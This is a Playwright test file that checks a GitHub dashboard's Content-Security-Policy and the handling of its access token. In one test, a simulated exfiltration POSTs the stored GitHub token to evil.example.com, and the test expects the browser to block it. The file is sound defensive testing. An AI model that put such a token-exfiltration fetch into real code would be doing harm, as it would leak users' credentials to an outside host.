import { expect, test } from '@playwright/test'
import { mockGitHub, signIn, skipIntro } from './fixtures/github'

/**
 * The Content-Security-Policy is only worth having if it is strict enough to
 * stop an exfiltration and loose enough to let the application run. Those pull
 * against each other, and only a browser can settle the argument -- which is
 * why these are here and not in a unit test.
 */

test.describe('the content security policy', () => {
  test('is delivered with the page', async ({ page }) => {
    await page.goto('/')
    const policy = await page
      .locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content')

    expect(policy).toBeTruthy()
    expect(policy!.replace(/\s+/g, ' ')).toContain("connect-src 'self' https://api.github.com")
    expect(policy!.replace(/\s+/g, ' ')).toContain("script-src 'self'")
    expect(policy).not.toContain("script-src 'self' 'unsafe-inline'")
    expect(policy).not.toContain('unsafe-eval')
  })

  test('blocks the app from reaching any host but GitHub', async ({ page }) => {
    // This is the property the whole policy exists for. A dependency that turned
    // hostile could still run inside the bundle; what it must not be able to do
    // is take the token somewhere.
    await mockGitHub(page)
    await signIn(page)
    await page.goto('/')

    const result = await page.evaluate(async () => {
      try {
        await fetch('https://evil.example.com/steal', {
          method: 'POST',
          body: sessionStorage.getItem('pr-radar.token.v1') ?? '',
        })
        return 'allowed'
      } catch (error) {
        return `blocked: ${(error as Error).name}`
      }
    })

    expect(result).toMatch(/^blocked/)
  })

  test('still allows the app to reach GitHub', async ({ page }) => {
    // The other half. A policy that blocked everything would pass the test above
    // and leave a dashboard that cannot load anything.
    await mockGitHub(page)
    await signIn(page)
    await page.goto('/')

    await expect(page.getByText('Add a keyboard shortcut for the filter box')).toBeVisible()
  })

  test('refuses to run an injected inline script', async ({ page }) => {
    await mockGitHub(page)
    await page.goto('/')

    const executed = await page.evaluate(() => {
      const script = document.createElement('script')
      script.textContent = 'window.__injected = true'
      document.head.append(script)
      return (window as unknown as { __injected?: boolean }).__injected === true
    })

    expect(executed).toBe(false)
  })

  test('loads the application without any policy violation', async ({ page }) => {
    // A policy tuned by guesswork produces a page that looks fine and quietly
    // drops one stylesheet. Collect the violations and require none.
    const violations: string[] = []
    page.on('console', (message) => {
      if (/Content Security Policy/i.test(message.text())) violations.push(message.text())
    })

    await mockGitHub(page)
    await signIn(page)
    await page.goto('/')
    await expect(page.getByText('Add a keyboard shortcut for the filter box')).toBeVisible()

    expect(violations).toEqual([])
  })
})

test.describe('the token', () => {
  test('never appears in a URL', async ({ page }) => {
    // A token in a query string ends up in browser history, in referrers and in
    // every access log between here and GitHub.
    const urls: string[] = []
    page.on('request', (request) => urls.push(request.url()))

    await mockGitHub(page)
    await signIn(page)
    await page.goto('/')
    await expect(page.getByText('Add a keyboard shortcut for the filter box')).toBeVisible()

    expect(urls.filter((url) => url.includes('ghp_'))).toEqual([])
  })

  test('is gone after the tab is closed', async ({ browser }) => {
    const context = await browser.newContext()
    const page = await context.newPage()
    await mockGitHub(page)
    await skipIntro(page)
    await page.goto('/')
    await page.getByLabel('GitHub personal access token').fill('ghp_good')
    await page.getByRole('button', { name: 'Continue' }).click()
    await expect(page.getByLabel('GitHub personal access token')).toBeHidden()
    await context.close()

    // A fresh context is a fresh session: the same promise the README makes to
    // anyone using this on a shared machine.
    const second = await browser.newContext()
    const fresh = await second.newPage()
    await mockGitHub(fresh)
    await skipIntro(fresh)
    await fresh.goto('/')
    await expect(fresh.getByLabel('GitHub personal access token')).toBeVisible()
    await second.close()
  })
})
